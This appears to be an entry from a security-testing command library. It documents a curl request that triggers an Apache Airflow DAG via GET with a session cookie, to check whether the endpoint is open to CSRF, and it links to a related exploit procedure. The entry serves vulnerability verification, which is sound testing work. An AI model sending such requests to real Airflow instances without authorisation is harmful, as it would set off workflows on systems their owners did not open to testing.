---
data: >-
  curl -X GET "http://airflow-host:8080/dag/{dag_id}/trigger?conf=%7B%7D" -H
  "Cookie: session_id=your_session_cookie"
tags:
  - csrf
  - web
  - testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-12-01T00:00:00Z'
updated_at: '2025-12-14T17:27:42.982Z'
id: 697ce7fa-4bf4-4562-a83c-4a8783e40e78
verified: false
validated: true
submitted: true
---
# curl-trigger-dag

## Command

```bash
curl -X GET "http://airflow-host:8080/dag/{dag_id}/trigger?conf=%7B%7D" -H "Cookie: session_id=your_session_cookie"
```

## Description

This command simulates a GET request to the vulnerable Airflow DAG trigger endpoint, testing for CSRF bypass by including a session cookie. Use it to verify the vulnerability without a malicious site.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| `http://airflow-host:8080/dag/{dag_id}/trigger?conf=%7B%7D` | Target URL with DAG ID and empty config | Yes |
| `-H "Cookie: session_id=..."` | Includes the authenticated session cookie | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "http://localhost:8080/dag/example_dag/trigger?conf=%7B%7D" -H "Cookie: session_id=abc123"
```

### Advanced Usage

```bash
curl -X GET "http://airflow.example.com:8080/dag/my_dag/trigger?conf={\"key\":\"value\"}" -H "Cookie: session_id=abc123" -v
```

## Expected Output

Successful response: HTTP/1.1 200 OK with JSON like {"dag_run_id": "manual__2023-12-01T00:00:00+00:00", "state": "queued"}. Failure indicates protection or invalid session.

## Related

- [[Related Procedure: Exploit-CSRF-in-Airflow-DAG-Trigger]]
